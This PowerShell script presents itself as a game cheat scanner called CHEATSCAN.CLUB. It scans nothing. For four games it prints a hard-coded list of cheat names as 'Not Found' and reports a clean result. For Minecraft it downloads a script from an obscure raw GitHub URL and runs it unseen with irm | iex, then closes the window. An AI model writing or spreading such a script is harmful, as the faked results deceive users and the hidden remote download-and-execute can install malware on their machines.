<#
.SYNOPSIS
    CHEATSCAN.CLUB - Game cheat scanner simulation
.DESCRIPTION
    Menu-driven script that "scans" for known cheat providers for selected games.
    For Minecraft, it runs an external mod checker via irm/iex.
#>

Clear-Host
Write-Host "------ CHEATSCAN.CLUB ------" -ForegroundColor Cyan
Write-Host "1. Arc Raiders"
Write-Host "2. Rust"
Write-Host "3. R6"
Write-Host "4. Fortnite"
Write-Host "5. Minecraft"
Write-Host ""

$choice = Read-Host "Select a Game to Scan"
$choiceLower = $choice.Trim().ToLower()

# Determine game and cheat list
$game = $null
$cheats = @()

switch -Regex ($choiceLower) {
    '^1$|^arc' {
        $game = 'Arc Raiders'
        $cheats = @(
            'ARC-Radar',
            'ExtractionX',
            'RaiderESP',
            'SperanzaHook',
            'TopsideAim',
            'ARC-Loader',
            'LootTrackerPro',
            'HatchHack',
            'RustBeltAimbot',
            'SyncSpooferARC',
            'NexusExternal',
            'VaultScope'
        )
    }
    '^2$|^rust' {
        $game = 'Rust'
        $cheats = @(
            'Rustangelo',
            'RustCheat',
            'ApexAim',
            'PrivateCheats',
            'DarkCheats',
            'AimStar',
            'UnityCheat',
            'R5Reloaded',
            'ExternalOverlay',
            'InternalHook',
            'GhostAim',
            'SilentAimProject'
        )
    }
    '^3$|^r6|^rainbow' {
        $game = 'Rainbow Six Siege'
        $cheats = @(
            'SiegeX',
            'R6 Vega',
            'R6 Emerald',
            'ForceCheats',
            'RevisionCheats',
            'ShxdowCheats',
            'R6 Legion',
            'DiamondESP',
            'ChampionRadar',
            'SilentAimR6',
            'TriggerBotPro',
            'HwidSpooferR6'
        )
    }
    '^4$|^fortnite|^fn' {
        $game = 'Fortnite'
        $cheats = @(
            'AimJunkies',
            'SystemCheats',
            'ArtificialAiming',
            'x22Cheats',
            'Vanta',
            'Kosmos',
            'Interwebz',
            'Quantum',
            'Echo',
            'BattleFN',
            'Complex',
            'RainCheats'
        )
    }
    '^5$|^minecraft|^mc' {
        $game = 'Minecraft'
    }
    default {
        Write-Host "Invalid selection. Exiting." -ForegroundColor Red
        Start-Sleep -Seconds 2
        exit
    }
}

# Handle Minecraft separately
if ($game -eq 'Minecraft') {
    Write-Host "`nScanning Minecraft..." -ForegroundColor Yellow
    # Run the external mod checker
    irm https://raw.githubusercontent.com/BYvabiUJrCpd1xj9dUXU/lol/main/cheatscan.club.ps1 | iex
    # After the remote script finishes, close the PowerShell window
    exit
}

# Scan the selected game
Write-Host "`nScanning $game..." -ForegroundColor Yellow
Start-Sleep -Seconds 1

foreach ($cheat in $cheats) {
    Write-Host "$cheat Not Found" -ForegroundColor Red
    Start-Sleep -Seconds 0.75   # Slow, one by one
}

Write-Host "`nScanner Finished No Cheats Has Been Found" -ForegroundColor Green
Start-Sleep -Seconds 2
exit